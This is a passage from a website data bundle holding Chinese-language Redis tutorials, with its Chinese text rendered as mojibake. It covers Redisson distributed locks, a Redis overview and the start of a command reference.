clientï¼ä¹æä¾äºåå¸å¼éçæ¯æãæä¹éå¸¸æ¨èå¤§å®¶ä½¿ç¨ï¼ä¸ºä»ä¹å¢ï¼\n\nåæ³ä¸ä¸ä¸é¢è¯´çï¼å¦æèªå·±åä»£ç æ¥éè¿ redis è®¾ç½®ä¸ä¸ªå¼ï¼æ¯éè¿ä¸é¢è¿ä¸ªå½ä»¤è®¾ç½®çã\n\nset anylock unique_value nx px 30000\n\n\n1\n\n\nè¿éè®¾ç½®çè¶æ¶æ¶é´æ¯ 30sï¼åå¦æè¶è¿ 30s é½è¿æ²¡æå®æä¸å¡é»è¾çæåµä¸ï¼key ä¼è¿æï¼å¶ä»çº¿ç¨æå¯è½ä¼è·åå°éã\n\nè¿æ ·ä¸æ¥çè¯ï¼ç¬¬ä¸ä¸ªçº¿ç¨è¿æ²¡æ§è¡å®ä¸å¡é»è¾ï¼ç¬¬äºä¸ªçº¿ç¨è¿æ¥äºä¹ä¼åºç°çº¿ç¨å®å¨é®é¢ãæä»¥æä»¬è¿éè¦é¢å¤çå»ç»´æ¤è¿ä¸ªè¿ææ¶é´ï¼å¤ªéº»ç¦äºï½\n\næä»¬æ¥çç redisson æ¯æä¹å®ç°çï¼åæåä¸ä¸ä½¿ç¨ redission çç½ï¼\n\nconfig config = new config();\nconfig.useclusterservers()\n.addnodeaddress("redis://192.168.31.101:7001")\n.addnodeaddress("redis://192.168.31.101:7002")\n.addnodeaddress("redis://192.168.31.101:7003")\n.addnodeaddress("redis://192.168.31.102:7001")\n.addnodeaddress("redis://192.168.31.102:7002")\n.addnodeaddress("redis://192.168.31.102:7003");\n\nredissonclient redisson = redisson.create(config);\n\n\nrlock lock = redisson.getlock("anylock");\nlock.lock();\nlock.unlock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nå°±æ¯è¿ä¹ç®åï¼æä»¬åªéè¦éè¿å®ç api ä¸­ç lock å unlock å³å¯å®æåå¸å¼éï¼ä»å¸®æä»¬èèäºå¾å¤ç»èï¼\n\n * redisson æææä»¤é½éè¿ lua èæ¬æ§è¡ï¼redis æ¯æ lua èæ¬åå­æ§æ§è¡\n * redisson è®¾ç½®ä¸ä¸ª key çé»è®¤è¿ææ¶é´ä¸º 30s, å¦ææä¸ªå®¢æ·ç«¯ææä¸ä¸ªéè¶è¿äº 30s æä¹åï¼\n   redisson ä¸­æä¸ä¸ª watchdog çæ¦å¿µï¼ç¿»è¯è¿æ¥å°±æ¯çé¨çï¼å®ä¼å¨ä½ è·åéä¹åï¼æ¯é 10 ç§å¸®ä½ æ key çè¶æ¶æ¶é´è®¾ä¸º 30s\n   è¿æ ·çè¯ï¼å°±ç®ä¸ç´ææéä¹ä¸ä¼åºç° key è¿æäºï¼å¶ä»çº¿ç¨è·åå°éçé®é¢äºã\n * redisson ç âçé¨çâ é»è¾ä¿è¯äºæ²¡ææ­»éåçã\n   å¦ææºå¨å®æºäºï¼çé¨çä¹å°±æ²¡äºãæ­¤æ¶å°±ä¸ä¼å»¶é¿ key çè¿ææ¶é´ï¼å°äº 30s ä¹åå°±ä¼èªå¨è¿æäºï¼å¶ä»çº¿ç¨å¯ä»¥è·åå°é)\n\n\n# å¯¹äº redis çåå¸å¼éèè¨ï¼å®æä»¥ä¸ç¼ºç¹ï¼\n\n * å®è·åéçæ¹å¼ç®åç²æ´ï¼è·åä¸å°éç´æ¥ä¸æ­å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n * å¦å¤æ¥è¯´çè¯ï¼redis çè®¾è®¡å®ä½å³å®äºå®çæ°æ®å¹¶ä¸æ¯å¼ºä¸è´æ§ç (redis ä¸ç´æ§é®é¢çè¿é)ï¼å¨æäºæç«¯æåµä¸ï¼å¯è½ä¼åºç°é®é¢ãéçæ¨¡åä¸å¤å¥å£®\n * å³ä¾¿ä½¿ç¨ redlock ç®æ³æ¥å®ç°ï¼å¨æäºå¤æåºæ¯ä¸ï¼ä¹æ æ³ä¿è¯å¶å®ç° 100% æ²¡æé®é¢ï¼å³äº redlock çè®¨è®ºå¯ä»¥ç how to do distributed locking\n * redis åå¸å¼éï¼å¶å®éè¦èªå·±ä¸æ­å»å°è¯è·åéï¼æ¯è¾æ¶èæ§è½ã\n\nä½æ¯å¦ä¸æ¹é¢ä½¿ç¨ redis å®ç°åå¸å¼éå¨å¾å¤ä¼ä¸ä¸­éå¸¸å¸¸è§ï¼èä¸å¤§é¨åæåµä¸é½ä¸ä¼éå°æè°ç âæç«¯å¤æåºæ¯â\n\næä»¥ä½¿ç¨ redis ä½ä¸ºåå¸å¼éä¹ä¸å¤±ä¸ºä¸ç§å¥½çæ¹æ¡ï¼æéè¦çä¸ç¹æ¯ redis çæ§è½å¾é«ï¼å¯ä»¥æ¯æé«å¹¶åçè·åãéæ¾éæä½ã\n\nspring boot æ´å redisson çä¸¤ç§æ¹å¼ï¼\nèªå·±éç½®æ¹å¼ï¼https://www.cnblogs.com/yangzhilong/p/7605807.html\nspring boot starter æ¹å¼ï¼https://blog.csdn.net/a1058926697/article/details/116670391',charsets:{cjk:!0}},{title:"Redis ä»ç»",frontmatter:{title:"Redis ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1600",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1600.Redis%E4%BB%8B%E7%BB%8D.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1600.Redisä»ç».md",key:"v-21786cb6",path:"/redis/1600/",headers:[{level:2,title:"Redisçæ¥å",slug:"redisçæ¥å",normalizedTitle:"redis çæ¥å",charIndex:174},{level:2,title:"ä¸ºä½éè¦Redis",slug:"ä¸ºä½éè¦redis",normalizedTitle:"ä¸ºä½éè¦ redis",charIndex:423},{level:2,title:"Redisçåè½",slug:"redisçåè½",normalizedTitle:"redis çåè½",charIndex:676},{level:2,title:"Redisçåºç¨åºæ¯",slug:"redisçåºç¨åºæ¯",normalizedTitle:"redis çåºç¨åºæ¯",charIndex:1139},{level:2,title:"Redisçæªæ¥",slug:"redisçæªæ¥",normalizedTitle:"redis çæªæ¥",charIndex:1973}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Redisçæ¥å ä¸ºä½éè¦Redis Redisçåè½ Redisçåºç¨åºæ¯ Redisçæªæ¥",content:"Redisï¼REmote DIctionary Serverï¼æ¯ä¸ä¸ªå¼æºçä½¿ç¨ ANSI C ç¼åãæ¯æç½ç»ãå¯åºäºåå­äº¦å¯æä¹åçæ¥å¿åãKey-Value æ°æ®åºï¼å¹¶æä¾å¤ç§è¯­è¨ç APIãä»åå­ä¸çï¼Redis çåç§°æ¥èªè¥¿ç­çç âçº¢è²â è¿ä¸ªè¯ï¼æå³ç âçº¢è²ç¯ç¬¼â æ âçº¢è²æå¸âï¼è¡¨ç¤ºå¯¹æ°æ®åºå¿«éãå¯æ©å±ãé«å¯é æ§çè¿½æ±ã\n\n\n# Redis çæ¥å\n\nRedis çè¯çå¯ä»¥è¿½æº¯å° 2009 å¹´ï¼å½æ¶ Salvatore Sanfilippoï¼å³ antirezï¼ä¸ºäºè§£å³èªå·±å¨ä½¿ç¨ Memcached æ¶éå°çä¸äºé®é¢ï¼å¼å§å¼å RedisãMemcached æ¯ä¸ä¸ªå¼æºçåå­ä¸­çæ°æ®ç¼å­ç³»ç»ï¼ä¸»è¦ç¨äºåå°æ°æ®åºè®¿é®æ¬¡æ°ï¼ä»¥æé«ç½ç«çè®¿é®éåº¦ãç¶èï¼Sanfilippo åç° Memcached çåè½è¿äºç®åï¼æ æ³æ»¡è¶³ä¸äºå¤æçéæ±ï¼å¦æ°æ®æä¹ååæ°æ®åæ­¥ç­ãå æ­¤ï¼ä»å³å®å¼åä¸ä¸ªå¨æ°çæ°æ®åºï¼ä»¥æ»¡è¶³è¿äºéæ±ã\n\n\n# ä¸ºä½éè¦ Redis\n\néçäºèç½çåå±ï¼æ°æ®éä¸æ­å¢é¿ï¼ä¼ ç»çå³ç³»åæ°æ®åºå¨å¤çå¤§éæ°æ®æ¶ï¼æ§è½éæ¸ä¸éãåæ¶ï¼éçåå¸å¼ç³»ç»çæ®åï¼æ°æ®ä¸è´æ§ååæ­¥é®é¢ä¹åå¾è¶æ¥è¶çªåºãRedis çåºç°ï¼å°±æ¯ä¸ºäºè§£å³è¿äºé®é¢ã\n\né¦åï¼Redis æ¯åå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥æ»¡è¶³é«å¹¶åãå¤§æ°æ®éçå¤çéæ±ãå¶æ¬¡ï¼Redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ï¼å¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ãæåï¼Redis è¿æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n\n\n# Redis çåè½\n\n 1. æ°æ®ç»æï¼Redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ãè¿äºæ°æ®ç»æå¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ã\n 2. æ°æ®æä½ï¼Redis æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼åæ¬å¢å ãå é¤ãä¿®æ¹åæ¥è¯¢ç­æä½ãåæ¶ï¼Redis è¿æ¯æäºå¡æ§å¶åä¹è§éç­æºå¶ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n 3. æ°æ®æä¹åï¼Redis æ¯æå¤ç§æ°æ®æä¹åæ¹å¼ï¼åæ¬ RDB å AOF ç­ãRDB éè¿çææ°æ®å¿«ç§çæ¹å¼è¿è¡æä¹åï¼è AOF åéè¿è®°å½æä½æ¥å¿çæ¹å¼è¿è¡æä¹åãè¿ä¸¤ç§æ¹å¼é½å¯ä»¥ä¿è¯æ°æ®çå¯é æ§åæ¢å¤è½åã\n 4. æ°æ®åæ­¥ï¼Redis æ¯æä¸»ä»å¤å¶åéç¾¤å¤å¶ä¸¤ç§æ¹å¼è¿è¡æ°æ®åæ­¥ãä¸»ä»å¤å¶å¯ä»¥å®ç°è¯»ååç¦»åè´è½½åè¡¡ç­åè½ï¼èéç¾¤å¤å¶åå¯ä»¥å®ç°æ°æ®çåå¸å¼å­å¨åå®¹ç¾ç­åè½ã\n 5. åå¸å¼éï¼Redis æä¾äºåå¸å¼éåè½ï¼å¯ä»¥å¨åå¸å¼ç³»ç»ä¸­å®ç°èµæºå±äº«åå¹¶åæ§å¶ç­åè½ã\n 6. å¶ä»åè½ï¼é¤äºä¸è¿°åè½å¤ï¼Redis è¿æ¯ææ¶æ¯éåãåå¸è®¢éãLua èæ¬ç­åè½ã\n\n\n# Redis çåºç¨åºæ¯\n\n 1.  ç¼å­ï¼Redis ä½ä¸ºåå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥ä½ä¸ºç¼å­å±ä½¿ç¨ãéè¿å°ç­ç¹æ°æ®å­å¨å¨ Redis ä¸­ï¼å¯ä»¥åå°å¯¹åç«¯æ°æ®åºçè®¿é®æ¬¡æ°ï¼æé«ç½ç«çè®¿é®éåº¦ã\n 2.  åå¸å¼ç³»ç»ï¼Redis æ¯æåå¸å¼å­å¨åå¤å¶ç­åè½ï¼å¯ä»¥ç¨äºæå»ºåå¸å¼ç³»ç»ãéè¿å°æ°æ®åæ£å°å¤ä¸ªèç¹ä¸å­å¨ï¼å¯ä»¥å®ç°æ°æ®çåå¸å¼å¤çåå®¹ç¾ç­åè½ã\n 3.  æ¶æ¯éåï¼Redis å¯ä»¥ä½ä¸ºæ¶æ¯éåä½¿ç¨ï¼å¯ä»¥å®ç°å¼æ­¥å¤çåæ¶æ¯çåå¸è®¢éç­åè½ãéè¿å°æ¶æ¯å­å¨å¨ Redis ä¸­ï¼å¯ä»¥å®ç°æ¶æ¯çæä¹ååå¯é ä¼ è¾ç­åè½ã\n 4.  æ°æ®åºæ©å±ï¼Redis å¯ä»¥ä½ä¸ºæ°æ®åºçæ©å±ä½¿ç¨ï¼å¯ä»¥å®ç°æ°æ®çå¿«éè¯»ååå¤çç­åè½ãéè¿å°é¨åæ°æ®å­å¨å¨ Redis ä¸­ï¼å¯ä»¥åè½»æ°æ®åºçååï¼æé«ç³»ç»çæ§è½åå¯é æ§ã\n 5.  å®æ¶åæï¼Redis çå¿«éè¯»åè½åä½¿å¶æä¸ºå®æ¶åæå·¥å·ççæ³éæ©ãå®å¯ä»¥ä½ä¸ºæ°æ®ç¼å²å±ï¼ä¸ºå®æ¶åææä¾è¶³å¤çæ°æ®å­å¨ç©ºé´åæ¥è¯¢æ§è½ã\n 6.  ç¤¾äº¤ç½ç»ï¼Redis å¯ä»¥ç¨äºå®ç°ç¤¾äº¤ç½ç»ä¸­çåç§åè½ï¼å¦ç¨æ·è®¤è¯ãåå®¹åå¸ãå¥½åå³ç³»ç®¡çç­ãå®çé«éè¯»ååä¸°å¯çæ°æ®ç»æä½¿å¾è¿äºæä½åå¾ç®åé«æã\n 7.  æ¸¸æå¼åï¼å¨æ¸¸æå¼åä¸­ï¼Redis å¯ä»¥ä½ä¸ºåç«¯æå¡å¨çä¸é¨åæ¥å¤çæ¸¸æé»è¾åç©å®¶æ°æ®ãå®æä¾çé«æ§è½åå¿«éååºä½¿å¾æ¸¸æä½éªæ´å æµçã\n 8.  ç©èç½ï¼å¨ç©èç½åºç¨ä¸­ï¼Redis å¯ä»¥ç¨äºå­å¨åç®¡çä¼ æå¨æ°æ®ãè®¾å¤ç¶æç­ä¿¡æ¯ãå®çæä¹åååå¸å¼ç¹æ§ä½¿å¾ç©èç½è®¾å¤è½å¤å¯é å°å±äº«ååæ­¥æ°æ®ã\n 9.  ç¼å­ç½å³ï¼Redis å¯ä»¥ä½ä¸ºç¼å­ç½å³æ¥ä¼å API è¯·æ±çæ§è½ãå®è½å¤å¿«éå°ååº API è¯·æ±å¹¶åå°å¯¹åç«¯æå¡çè°ç¨æ¬¡æ°ï¼ä»èæé«ç³»ç»çååéåååºéåº¦ã\n 10. å®æ¶æ¨èç³»ç»ï¼å¨å®æ¶æ¨èç³»ç»ä¸­ï¼Redis å¯ä»¥ç¨äºå­å¨ç¨æ·è¡ä¸ºæ°æ®ãååä¿¡æ¯ç­å®æ¶æ´æ°çæ°æ®ãå®è½å¤å¿«éå°å¤çæ¨èç®æ³çè®¡ç®åæ¥è¯¢è¯·æ±ï¼ä¸ºç¨æ·æä¾ä¸ªæ§åçæ¨èæå¡ã\n\n\n# Redis çæªæ¥\n\néçäºèç½çä¸æ­åå±ï¼Redis çåºç¨åºæ¯ä¹å°è¶æ¥è¶å¹¿æ³ãæªæ¥ï¼Redis å¯è½ä¼å¨ä»¥ä¸å ä¸ªæ¹é¢ææ´å¤§çåå±ï¼\n\n 1. åå¸å¼ç³»ç»ï¼éçäºè®¡ç®åå¤§æ°æ®ææ¯çåå±ï¼åå¸å¼ç³»ç»å°æ´å æ®åãRedis ä½ä¸ºåå¸å¼ç³»ç»çéè¦ç»æé¨åï¼å°ä¼å¨æ°æ®å­å¨ãæ°æ®åæ­¥åå®¹ç¾ç­æ¹é¢åæ¥æ´å¤§çä½ç¨ã\n 2. äººå·¥æºè½ï¼äººå·¥æºè½çåå±éè¦å¤§éçæ°æ®å¤çååæï¼Redis çé«æ§è½åä¸°å¯çæ°æ®ç»æå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼Redis å¯è½ä¼å¨äººå·¥æºè½é¢åææ´å¹¿æ³çåºç¨ã\n 3. ç©èç½ï¼ç©èç½çåå±éè¦å¤§éçæ°æ®ééåå¤çï¼Redis çé«æ§è½åä½å»¶è¿å¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼Redis å¯è½ä¼å¨ç©èç½é¢åææ´å¹¿æ³çåºç¨ã\n 4. åºåé¾ï¼åºåé¾ææ¯éè¦å¤§éçæ°æ®å­å¨åéªè¯ï¼Redis çé«å¯é æ§åæ°æ®æä¹åå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼Redis å¯è½ä¼å¨åºåé¾é¢åææ´å¹¿æ³çåºç¨ã",normalizedContent:"redisï¼remote dictionary serverï¼æ¯ä¸ä¸ªå¼æºçä½¿ç¨ ansi c ç¼åãæ¯æç½ç»ãå¯åºäºåå­äº¦å¯æä¹åçæ¥å¿åãkey-value æ°æ®åºï¼å¹¶æä¾å¤ç§è¯­è¨ç apiãä»åå­ä¸çï¼redis çåç§°æ¥èªè¥¿ç­çç âçº¢è²â è¿ä¸ªè¯ï¼æå³ç âçº¢è²ç¯ç¬¼â æ âçº¢è²æå¸âï¼è¡¨ç¤ºå¯¹æ°æ®åºå¿«éãå¯æ©å±ãé«å¯é æ§çè¿½æ±ã\n\n\n# redis çæ¥å\n\nredis çè¯çå¯ä»¥è¿½æº¯å° 2009 å¹´ï¼å½æ¶ salvatore sanfilippoï¼å³ antirezï¼ä¸ºäºè§£å³èªå·±å¨ä½¿ç¨ memcached æ¶éå°çä¸äºé®é¢ï¼å¼å§å¼å redisãmemcached æ¯ä¸ä¸ªå¼æºçåå­ä¸­çæ°æ®ç¼å­ç³»ç»ï¼ä¸»è¦ç¨äºåå°æ°æ®åºè®¿é®æ¬¡æ°ï¼ä»¥æé«ç½ç«çè®¿é®éåº¦ãç¶èï¼sanfilippo åç° memcached çåè½è¿äºç®åï¼æ æ³æ»¡è¶³ä¸äºå¤æçéæ±ï¼å¦æ°æ®æä¹ååæ°æ®åæ­¥ç­ãå æ­¤ï¼ä»å³å®å¼åä¸ä¸ªå¨æ°çæ°æ®åºï¼ä»¥æ»¡è¶³è¿äºéæ±ã\n\n\n# ä¸ºä½éè¦ redis\n\néçäºèç½çåå±ï¼æ°æ®éä¸æ­å¢é¿ï¼ä¼ ç»çå³ç³»åæ°æ®åºå¨å¤çå¤§éæ°æ®æ¶ï¼æ§è½éæ¸ä¸éãåæ¶ï¼éçåå¸å¼ç³»ç»çæ®åï¼æ°æ®ä¸è´æ§ååæ­¥é®é¢ä¹åå¾è¶æ¥è¶çªåºãredis çåºç°ï¼å°±æ¯ä¸ºäºè§£å³è¿äºé®é¢ã\n\né¦åï¼redis æ¯åå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥æ»¡è¶³é«å¹¶åãå¤§æ°æ®éçå¤çéæ±ãå¶æ¬¡ï¼redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ï¼å¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ãæåï¼redis è¿æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n\n\n# redis çåè½\n\n 1. æ°æ®ç»æï¼redis æ¯æå¤ç§æ°æ®ç»æï¼åæ¬å­ç¬¦ä¸²ãåå¸ãåè¡¨ãéååæåºéåç­ãè¿äºæ°æ®ç»æå¯ä»¥æ»¡è¶³åç§å¤æçä¸å¡éæ±ã\n 2. æ°æ®æä½ï¼redis æä¾äºä¸°å¯çæ°æ®æä½åäºå¡æ§å¶åè½ï¼åæ¬å¢å ãå é¤ãä¿®æ¹åæ¥è¯¢ç­æä½ãåæ¶ï¼redis è¿æ¯æäºå¡æ§å¶åä¹è§éç­æºå¶ï¼å¯ä»¥ä¿è¯æ°æ®çä¸è´æ§åå¯é æ§ã\n 3. æ°æ®æä¹åï¼redis æ¯æå¤ç§æ°æ®æä¹åæ¹å¼ï¼åæ¬ rdb å aof ç­ãrdb éè¿çææ°æ®å¿«ç§çæ¹å¼è¿è¡æä¹åï¼è aof åéè¿è®°å½æä½æ¥å¿çæ¹å¼è¿è¡æä¹åãè¿ä¸¤ç§æ¹å¼é½å¯ä»¥ä¿è¯æ°æ®çå¯é æ§åæ¢å¤è½åã\n 4. æ°æ®åæ­¥ï¼redis æ¯æä¸»ä»å¤å¶åéç¾¤å¤å¶ä¸¤ç§æ¹å¼è¿è¡æ°æ®åæ­¥ãä¸»ä»å¤å¶å¯ä»¥å®ç°è¯»ååç¦»åè´è½½åè¡¡ç­åè½ï¼èéç¾¤å¤å¶åå¯ä»¥å®ç°æ°æ®çåå¸å¼å­å¨åå®¹ç¾ç­åè½ã\n 5. åå¸å¼éï¼redis æä¾äºåå¸å¼éåè½ï¼å¯ä»¥å¨åå¸å¼ç³»ç»ä¸­å®ç°èµæºå±äº«åå¹¶åæ§å¶ç­åè½ã\n 6. å¶ä»åè½ï¼é¤äºä¸è¿°åè½å¤ï¼redis è¿æ¯ææ¶æ¯éåãåå¸è®¢éãlua èæ¬ç­åè½ã\n\n\n# redis çåºç¨åºæ¯\n\n 1.  ç¼å­ï¼redis ä½ä¸ºåå­æ°æ®åºï¼è¯»åéåº¦éå¸¸å¿«ï¼å¯ä»¥ä½ä¸ºç¼å­å±ä½¿ç¨ãéè¿å°ç­ç¹æ°æ®å­å¨å¨ redis ä¸­ï¼å¯ä»¥åå°å¯¹åç«¯æ°æ®åºçè®¿é®æ¬¡æ°ï¼æé«ç½ç«çè®¿é®éåº¦ã\n 2.  åå¸å¼ç³»ç»ï¼redis æ¯æåå¸å¼å­å¨åå¤å¶ç­åè½ï¼å¯ä»¥ç¨äºæå»ºåå¸å¼ç³»ç»ãéè¿å°æ°æ®åæ£å°å¤ä¸ªèç¹ä¸å­å¨ï¼å¯ä»¥å®ç°æ°æ®çåå¸å¼å¤çåå®¹ç¾ç­åè½ã\n 3.  æ¶æ¯éåï¼redis å¯ä»¥ä½ä¸ºæ¶æ¯éåä½¿ç¨ï¼å¯ä»¥å®ç°å¼æ­¥å¤çåæ¶æ¯çåå¸è®¢éç­åè½ãéè¿å°æ¶æ¯å­å¨å¨ redis ä¸­ï¼å¯ä»¥å®ç°æ¶æ¯çæä¹ååå¯é ä¼ è¾ç­åè½ã\n 4.  æ°æ®åºæ©å±ï¼redis å¯ä»¥ä½ä¸ºæ°æ®åºçæ©å±ä½¿ç¨ï¼å¯ä»¥å®ç°æ°æ®çå¿«éè¯»ååå¤çç­åè½ãéè¿å°é¨åæ°æ®å­å¨å¨ redis ä¸­ï¼å¯ä»¥åè½»æ°æ®åºçååï¼æé«ç³»ç»çæ§è½åå¯é æ§ã\n 5.  å®æ¶åæï¼redis çå¿«éè¯»åè½åä½¿å¶æä¸ºå®æ¶åæå·¥å·ççæ³éæ©ãå®å¯ä»¥ä½ä¸ºæ°æ®ç¼å²å±ï¼ä¸ºå®æ¶åææä¾è¶³å¤çæ°æ®å­å¨ç©ºé´åæ¥è¯¢æ§è½ã\n 6.  ç¤¾äº¤ç½ç»ï¼redis å¯ä»¥ç¨äºå®ç°ç¤¾äº¤ç½ç»ä¸­çåç§åè½ï¼å¦ç¨æ·è®¤è¯ãåå®¹åå¸ãå¥½åå³ç³»ç®¡çç­ãå®çé«éè¯»ååä¸°å¯çæ°æ®ç»æä½¿å¾è¿äºæä½åå¾ç®åé«æã\n 7.  æ¸¸æå¼åï¼å¨æ¸¸æå¼åä¸­ï¼redis å¯ä»¥ä½ä¸ºåç«¯æå¡å¨çä¸é¨åæ¥å¤çæ¸¸æé»è¾åç©å®¶æ°æ®ãå®æä¾çé«æ§è½åå¿«éååºä½¿å¾æ¸¸æä½éªæ´å æµçã\n 8.  ç©èç½ï¼å¨ç©èç½åºç¨ä¸­ï¼redis å¯ä»¥ç¨äºå­å¨åç®¡çä¼ æå¨æ°æ®ãè®¾å¤ç¶æç­ä¿¡æ¯ãå®çæä¹åååå¸å¼ç¹æ§ä½¿å¾ç©èç½è®¾å¤è½å¤å¯é å°å±äº«ååæ­¥æ°æ®ã\n 9.  ç¼å­ç½å³ï¼redis å¯ä»¥ä½ä¸ºç¼å­ç½å³æ¥ä¼å api è¯·æ±çæ§è½ãå®è½å¤å¿«éå°ååº api è¯·æ±å¹¶åå°å¯¹åç«¯æå¡çè°ç¨æ¬¡æ°ï¼ä»èæé«ç³»ç»çååéåååºéåº¦ã\n 10. å®æ¶æ¨èç³»ç»ï¼å¨å®æ¶æ¨èç³»ç»ä¸­ï¼redis å¯ä»¥ç¨äºå­å¨ç¨æ·è¡ä¸ºæ°æ®ãååä¿¡æ¯ç­å®æ¶æ´æ°çæ°æ®ãå®è½å¤å¿«éå°å¤çæ¨èç®æ³çè®¡ç®åæ¥è¯¢è¯·æ±ï¼ä¸ºç¨æ·æä¾ä¸ªæ§åçæ¨èæå¡ã\n\n\n# redis çæªæ¥\n\néçäºèç½çä¸æ­åå±ï¼redis çåºç¨åºæ¯ä¹å°è¶æ¥è¶å¹¿æ³ãæªæ¥ï¼redis å¯è½ä¼å¨ä»¥ä¸å ä¸ªæ¹é¢ææ´å¤§çåå±ï¼\n\n 1. åå¸å¼ç³»ç»ï¼éçäºè®¡ç®åå¤§æ°æ®ææ¯çåå±ï¼åå¸å¼ç³»ç»å°æ´å æ®åãredis ä½ä¸ºåå¸å¼ç³»ç»çéè¦ç»æé¨åï¼å°ä¼å¨æ°æ®å­å¨ãæ°æ®åæ­¥åå®¹ç¾ç­æ¹é¢åæ¥æ´å¤§çä½ç¨ã\n 2. äººå·¥æºè½ï¼äººå·¥æºè½çåå±éè¦å¤§éçæ°æ®å¤çååæï¼redis çé«æ§è½åä¸°å¯çæ°æ®ç»æå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼redis å¯è½ä¼å¨äººå·¥æºè½é¢åææ´å¹¿æ³çåºç¨ã\n 3. ç©èç½ï¼ç©èç½çåå±éè¦å¤§éçæ°æ®ééåå¤çï¼redis çé«æ§è½åä½å»¶è¿å¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼redis å¯è½ä¼å¨ç©èç½é¢åææ´å¹¿æ³çåºç¨ã\n 4. åºåé¾ï¼åºåé¾ææ¯éè¦å¤§éçæ°æ®å­å¨åéªè¯ï¼redis çé«å¯é æ§åæ°æ®æä¹åå¯ä»¥æ»¡è¶³è¿äºéæ±ãæªæ¥ï¼redis å¯è½ä¼å¨åºåé¾é¢åææ´å¹¿æ³çåºç¨ã",charsets:{cjk:!0}},{title:"Rediså½ä»¤ä»ç»",frontmatter:{title:"Rediså½ä»¤ä»ç»",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1601",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1601.Redis%E5%91%BD%E4%BB%A4%E4%BB%8B%E7%BB%8D.html",relativePath:"02.ä¸­é´ä»¶/03.redis/1601.Rediså½ä»¤ä»ç».md",key:"v-d6189198",path:"/redis/1601/",headers:[{level:2,title:"å¬ç¨å½ä»¤",slug:"å¬ç¨å½ä»¤",normalizedTitle:"å¬ç¨å½ä»¤",charIndex:2},{level:2,title:"å¤çæ¶é´",slug:"å¤çæ¶é´",normalizedTitle:"å¤çæ¶é´",charIndex:384},{level:2,title:"èªå¢åèªå",slug:"èªå¢åèªå",normalizedTitle:"èªå¢åèªå",charIndex:776},{level:2,title:"å­ç¬¦ä¸² String",slug:"å­ç¬¦ä¸²-string",normalizedTitle:"å­ç¬¦ä¸² string",charIndex:1002},{level:2,title:"åè¡¨ list",slug:"åè¡¨-list",normalizedTitle:"åè¡¨ list",charIndex:1660},{level:2,title:"éå set",slug:"éå-set",normalizedTitle:"éå set",charIndex:3448},{level:2,title:"æ£å hash åå¸ç±»å",slug:"æ£å-hash-åå¸ç±»å",normalizedTitle:"æ£å hash åå¸ç±»å",charIndex:4473},{level:2,title:"æåºéå zset",slug:"æåºéå-zset",normalizedTitle:"æåºéå zset",charIndex:5078},{level:2,title:"è®¢é/åå¸",slug:"è®¢é-åå¸",normalizedTitle:"è®¢é / åå¸",charIndex:6386},{level:2,title:"Redis5 ä¹ Streams æ°æ®ç±»å",slug:"redis5-ä¹-streams-æ°æ®ç±»å",normalizedTitle:"redis5 ä¹ streams æ°æ®ç±»å",charIndex:6673},{level:3,title:"streamsæ°æ®ç»æ",slug:"streamsæ°æ®ç»æ",normalizedTitle:"streams æ°æ®ç»æ",charIndex:7170},{level:3,title:"streamsåºç¡",slug:"streamsåºç¡",normalizedTitle:"streams åºç¡",charIndex:7409},{level:3,title:"streamså½ä»¤",slug:"streamså½ä»¤",normalizedTitle:"streams å½ä»¤",charIndex:7646},{level:3,title:"streamsä¸ç§æ¥è¯¢æ¨¡å¼",slug:"streamsä¸ç§æ¥è¯¢æ¨¡å¼",normalizedTitle:"streams ä¸ç§æ¥è¯¢æ¨¡å¼",charIndex:9790}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"å¬ç¨å½ä»¤ å¤çæ¶é´ èªå¢åèªå å­ç¬¦ä¸² String åè¡¨ list éå set æ£å hash åå¸ç±»å æåºéå zset è®¢é/åå¸ Redis5 ä¹ Streams æ°æ®ç±»å streamsæ°æ®ç»æ streamsåºç¡ streamså½ä»¤ streamsä¸ç§æ¥è¯¢æ¨¡å¼",content:'# å¬ç¨å½ä»¤\n\nå¯ä»¥å é¤ä»»ææ°æ®ç»æç key\n\ndel key \n\n\n1\n\n\næ¥çææ key\n\nkeys *\n\n\n1\n\n\næ ¹æ®ç»å®çéé¡¹ï¼å¯¹è¾å¥åè¡¨ãéåæè